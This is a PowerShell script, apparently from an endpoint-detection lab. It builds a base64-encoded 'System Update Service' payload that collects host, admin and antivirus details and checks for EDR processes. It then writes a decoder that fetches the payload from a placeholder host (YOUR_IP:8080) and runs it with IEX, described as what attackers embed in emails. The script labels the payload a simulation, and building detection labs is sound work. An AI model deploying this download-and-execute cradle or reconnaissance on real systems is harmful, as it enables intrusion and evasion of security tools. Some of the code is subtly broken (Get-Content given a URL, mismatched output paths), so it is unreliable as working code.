# Create advanced payload
$payload = @'
$host.ui.RawUI.WindowTitle = "System Update Service"
$host.ui.RawUI.BackgroundColor = "Black"
$host.ui.RawUI.ForegroundColor = "Green"
Clear-Host

Write-Host @"
  ____       _                  _____                                      
 / ___|  ___| |_ _   _ _ __    | ____|_ __   _   _ _ __ ___   ___ _ __ 
 \___ \ / _ \ __| | | | '_ \   |  _| | '_ \ | | | | '_ ` _ \ / _ \ '__|
  ___) |  __/ |_| |_| | |_) |  | |___| | | || |_| | | | | | |  __/ |   
 |____/ \___|\__|\__,_| .__(_) |_____|_| |_| \__,_|_| |_| |_|\___|_|   
                      |_|                                                 
"@ -ForegroundColor Cyan

Write-Host "`n[+] Establishing connection to C2 server..." -ForegroundColor Green
Start-Sleep -Seconds 2

Write-Host "[+] Enumerating system information..." -ForegroundColor Yellow
$sysInfo = @{
    ComputerName = $env:COMPUTERNAME
    UserName = $env:USERNAME
    Domain = $env:USERDOMAIN
    OS = (Get-CimInstance Win32_OperatingSystem).Caption
    Architecture = $env:PROCESSOR_ARCHITECTURE
    LocalAdmins = (Get-LocalGroupMember -Group "Administrators" -ErrorAction SilentlyContinue).Name
    RunningAV = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -ErrorAction SilentlyContinue).displayName
}

Write-Host "[+] System Information Collected:" -ForegroundColor Green
$sysInfo.GetEnumerator() | ForEach-Object {
    Write-Host "    $($_.Key): $($_.Value)" -ForegroundColor Cyan
}

Write-Host "`n[+] Checking for security products..." -ForegroundColor Yellow
Start-Sleep -Seconds 1

$processes = @("MsMpEng", "CrowdStrike", "SentinelOne", "cb.exe", "TaniumClient")
foreach ($proc in $processes) {
    if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
        Write-Host "    [!] Detected: $proc" -ForegroundColor Red
    }
}

Write-Host "`n[+] Establishing persistence..." -ForegroundColor Yellow
Write-Host "    [>] Registry Run Key" -ForegroundColor Gray
Write-Host "    [>] Scheduled Task" -ForegroundColor Gray
Write-Host "    [>] WMI Event Subscription" -ForegroundColor Gray

Start-Sleep -Seconds 2
Write-Host "`n[+] Waiting for further instructions from C2..." -ForegroundColor Green
Write-Host "[+] Beacon established. Session active." -ForegroundColor Cyan
Write-Host "`n[*] This is a simulation - no malicious actions performed" -ForegroundColor Yellow
'@

# Encode to Base64
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encodedPayload = [Convert]::ToBase64String($bytes)

# Save encoded payload
$encodedPayload | Out-File /home/kali/EDRLab/encoded.txt

# Save decoder script
@"
# This is what attackers embed in documents/emails
`$encoded = Get-Content http://YOUR_IP:8080/encoded.txt -Raw
`$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encoded))
IEX `$decoded
"@ | Out-File /kali/home/EDRLab/decoder.ps1

Write-Host "Encoded payload created!" -ForegroundColor Green
Write-Host "Length: $($encodedPayload.Length) characters" -ForegroundColor Cyan
Write-Host "`nFirst 100 chars of encoded payload:" -ForegroundColor Yellow
Write-Host $encodedPayload.Substring(0, 100) -ForegroundColor Gray
